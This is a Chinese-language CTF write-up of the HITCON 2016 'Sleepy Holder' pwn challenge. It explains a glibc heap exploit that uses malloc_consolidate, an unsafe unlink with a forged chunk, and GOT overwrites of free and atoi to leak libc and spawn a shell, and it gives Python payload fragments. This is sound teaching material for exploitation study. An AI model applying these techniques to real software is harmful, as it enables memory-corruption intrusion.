#[Hitcon CTF 2016] Sleepy Holder 300

> Category: pwn		
> point: 300

這題是看了 **meh** 的 writeup 提示才解出來的，heap 真是太深奧了QQ

64 bit ELF, NX, Partial RELRO, Stack Canary, no PIE
一開始會給三個選單：

1. Keep secret
2. Wipe secret
3. Renew secret

而這三個又可以分別選擇以下三種來進行操作：

1. small secret
2. big secret
3. huge secret

先來看看這幾個 func 在做什麼：

keep
----

~~~c
if(!buf_in_use){
	buf = calloc(1, size_of_kind);
	buf_in_use = 1;
	puts("Tell me your secret: ");
	read(0, buf, size_of_kind);
}
~~~
keep 會問你要保存什麼樣的秘密，接著檢查是不是已經分配過了，如果沒有則根據 small(40), big(4000), huge(400000)，不同選擇來分配大小，之後可以 read 進該 size 的長度的 payload。但是 huge secret 只能夠 `calloc` 一次，之後就不能再動了。

global buffer 上有三個 address 來存放這些 malloc 得到的記憶體位置，分別稱它為 `small_buf`, `big_buf`, `huge_buf`，除了這些之外，global buffer上還有 3 個 4bytes 的 buffer，來記錄這幾種秘密是不是 inuse。

wipe
----

~~~c
free(buf);
buf_in_use = 0;
~~~

這兩行 code 就很一般的 `free` 掉空間然後 inuse 清成 0。但是很重要的是這裡不會檢查是不是 not in use，而直接 `free` 掉。再來是 `free` 掉之後也不會把 buf 清成 NULL，global buffer 上會依舊指著剛剛 `calloc()` 的 address。如上面剛剛說的 huge secret 是不能 `free` 掉的。

renew
-----

~~~c
if(buf_in_use){
	puts("Tell me your secret: ");
	read(0, buf, size_of_kind);	
}
~~~

這裡就很簡單的可以重新讀東西進 buffer 裡。

攻擊手法：
---------

利用 unlink 來造成任意 address 的寫入。不過這邊需要知道一點：

[**malloc-consolidate-secret**][secret]

就是當 malloc 的 request 很大的時候，glibc 會先把 fastbin 回收，來避免 fragmentation problem，於是 fastbin 會先被放進 unsortbin，接著如果可以 consolidate 就會被放進 smallbin 裡，完成這些動作之後才會開始分配記憶體給剛剛的 request。

所以這裡需要用特殊的順序來讓我們進行 unlink：

1. keep small
2. keep big
3. wipe small
4. keep huge

這裡的 keep big 是為了不要讓 small chunk 跟 top chunk 合併，所以在 small chunk 跟 top chunk 中間放了 big chunk，之後把 small `free` 掉，在 call malloc(huge)，就會造成前面的 secret 所說的，把剛剛的 small chunk 從 fastbin list 移走，放到 small bin。

至於為什麼需要它放進 small bin 裡，原因是當初 `malloc` big chunk 的時候有把 big chunk 的 inuse bit 設成 1，我沒記錯的話是 default 都是 1，有 `free` 掉前面 chunk 才會被設成 0，被設成 1 的 code 如下：

~~~c
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
{
	remainder_size = size - nb;
	remainder = chunk_at_offset (victim, nb);
	av->top = remainder;
	set_head (victim, nb | PREV_INUSE |
				(av != &main_arena ? NON_MAIN_ARENA : 0));
	set_head (remainder, remainder_size | PREV_INUSE);
	
	check_malloced_chunk (av, victim, nb);
	void *p = chunk2mem (victim);
	alloc_perturb (p, bytes);
	return p;
}
~~~

在 `set_head` 的 macro 那邊，把 `nb` 跟 `PREV_INUSE` 做 `or`，而 `PREV_INUSE` 是一個 macro define 0x1。

所以當我們 malloc huge request 後，在進行 consolidate 的時候，因為他要把 small chunk 回收，這時候他會利用 small chunk 的 size 找到下一個 chunk，把下一個 chunk 的 inuse bit 拔掉：

~~~c
if (nextchunk != av->top) {
	nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
	
if (!nextinuse) {
	size += nextsize;
	unlink(av, nextchunk, bck, fwd);
} else
	clear_inuse_bit_at_offset(nextchunk, 0);
~~~

在那個 `clear_inuse_bit_at_offest` 就會把 big chunk 的 inuse bit 拔掉，這樣等等才能夠進行 unsafe unlink。

來看看接下來的順序

5. wipe small
6. keep small # send fake payload

這裡為什麼要再一次 `free(small)` 呢，是因為如果直接 keep small 的話，他會先看 fastbin 裡面有沒有可以用的 chunk，但是在剛剛 keep huge 時已經把 之前的 small chunk 回收，所以 fastbin 現在是空的，在 fastbin 裡沒東西的話他會去 smallbin 裡找，這時如果成功 allocate 的話，之前的 big chunk inuse bit 又會被設成 1 了，這樣等等就無法進行 unsafe unlink，這段 code 如下：

~~~c
if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
{
idx = fastbin_index (nb);
	mfastbinptr *fb = &fastbin (av, idx);
	mchunkptr pp = *fb;
	do
	{
		victim = pp;
		if (victim == NULL)
			break;
	}
while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim))
~~~

這裡會檢查 request size 是 fastbin 的範圍但是因為 fastbin 裡面沒有東西，所以那個 victim 會是 NULL，會 break 跳到 smallbin 那裡去要空間：

~~~c
if (in_smallbin_range (nb))
{
	idx = smallbin_index (nb);
	bin = bin_at (av, idx);
	
	if ((victim = last (bin)) != bin)
	{
		if (victim == 0) /* initialization check */
			malloc_consolidate (av);
		else
		{
			bck = victim->bk;
			if (__glibc_unlikely (bck->fd != victim))
			{
				errstr = "malloc(): smallbin double linked list corrupted";
				goto errout;
			}
			set_inuse_bit_at_offset (victim, nb);
			.....
		}
~~~

在最下面可以看到這時候 victim 拿到之前放進 smallbin 裡的 第一次 small chunk address，但是他會利用 size 也就是 nb 把 big chunk inuse bit 設成 1。

所以為了避免這個，我們先 `free(small)` again，這樣又可以把 small chunk 的 head 放進 fastbin 裡，這樣在 keep small 時候就可以避免上面事情發生。

在這裡 small 很像是重複 `free` 了兩次，但是因為 fastbin 只會檢查 fasttop 也就是 fastbin list 裡的第一個，因為剛剛在 keep huge 回收 fastbin 時被拿掉了所以可以 bypass double free 的檢查。

這裡 keep small 時輸入的 input 就可以開始偽造 fake chunk 了，payload 如下：

~~~python
fake_fd = 0x6020d0-0x18
fake_bk = 0x6020d0-0x10
payload = ""
payload += p64(0x0) # previous size not important
payload += p64(0x21) # fake chunk size
payload += p64(fake_fd)
payload += p64(fake_bk)
payload += p64(0x20) # fake previous size for big chunk
~~~

因為等等會利用 wipe(big) 來進行 unlink 所以這裡我們需要的任意 address 位置就把它設在 `0x6020d0` 也就是 global buffer 上的 small_buf 的位置，才能進行 renew。在這裡利用 payload 把 small chunk 可寫的地方當成另一個 chunk，然後 fake big chunk 的 previous size 這樣他在進行 unlink 才會找到我們偽造的 fd 跟 bk。

7. wipe(big) # trigger unlink

此時 `0x6020d0` 的位置，也就是 small_buf 的位置已經指到 global buffer 上了，後面就是利用 renew 來進行任意位置讀寫。
~~~assembly
0x6020b0:       0x00007f388c24f620      0x0000000000000000
0x6020c0:       0x00000000007fe9d0      0x00007f388c3e4010
0x6020d0:       0x00000000006020b8      0x0000000100000000
0x6020e0:       0x0000000000000001      0x0000000000000000
~~~

8. renew(small)

payload :

~~~python
payload = ""
payload += p64(0x0) # padding
payload += p64(free_got) # big_buf
payload += p64(0x0)
payload += p64(0x6020c0) # for write arbitrary
payload += p32(1)*3 # let us be easy to renew
~~~

在這裡我們把 `big_buf` 指到了 `free` 的 GOT entry，把 `small_buf` 指到了 `&big_buf`，之後好二次寫入，後面的 p32(1)*3 是為了讓 buf inuse 設成 1 才能進行 renew。

9. renew(big) 

接著利用 renew(big) 來把 `free` 的 GOT entry 上得值 hijack 成 call `puts`

payload :

~~~python
puts_plt = 0x400760
payload = p64(puts_plt)*2
~~~

10. renew(small) 
11. wipe(big)

重新 renew(small) 把 big_buf 指到 atoi 的 GOT entry 上，之後利用 wipe(big) 來 leak libc function address。

payload :

~~~python
payload = ""
payload += p64(atoi_got)
payload += p64(0x0)
payload += p64(0x6020c0) # address of big_buf
payload += p32(1)*3
~~~

12. renew(small)
13. renew(big)

這裡在 renew 一次 small 設好 inuse bit

payload:

~~~python
payload = ""
payload += p64(atoi_got)
payload += p64(0x0)
payload += p64(0x6020c0)
payload += p32(1)*3
~~~

接著 renew(big) 把 atoi GOT hijack 成 system

這樣在選單的地方不用輸入 1 or 2 or 3 直接輸入 `sh\x00`

就可以造成 atoi('sh') -> system('sh') 拿到 shell。

[secret]: https://github.com/lattera/glibc/blob/master/malloc/malloc.c#L3397
